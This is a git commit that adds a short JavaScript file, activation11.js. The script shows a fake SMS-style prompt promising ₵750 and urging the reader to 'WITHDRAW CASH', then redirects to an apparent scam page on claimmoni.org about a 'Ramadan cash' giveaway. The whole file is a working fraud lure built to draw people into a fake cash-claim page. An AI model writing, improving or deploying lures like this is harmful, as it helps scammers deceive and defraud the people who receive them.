ea98c64aca94b9acb219b94a72606ccc5e5cc509
clmmoni <kkween1.00@gmail.com>
2026-03-01 06:10:07 +0100

    Create activation11.js

---
+++ activation11.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₵750. Please press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://claimmoni.org/750-Mahamudu-Ramadan-cash.html';
+}
